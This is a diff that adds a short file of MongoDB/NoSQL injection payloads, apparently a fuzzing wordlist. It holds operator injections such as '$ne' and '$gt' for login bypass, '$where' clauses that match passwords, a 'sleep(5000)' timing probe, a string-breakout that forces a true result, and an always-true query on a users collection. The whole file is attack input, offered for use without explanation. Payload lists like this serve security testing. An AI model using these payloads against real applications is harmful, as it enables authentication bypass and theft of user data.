@@ -1,0 +1,7 @@
+user[$ne]=1
+user[$gt]=
+{"$where":"this.password.match(/.*/)"}
+{"$where":"sleep(5000)"}
+{"$where":"';return true;var foo='"}
+{"$func":"function(){}"}
+db.users.find({$where:"1==1"})
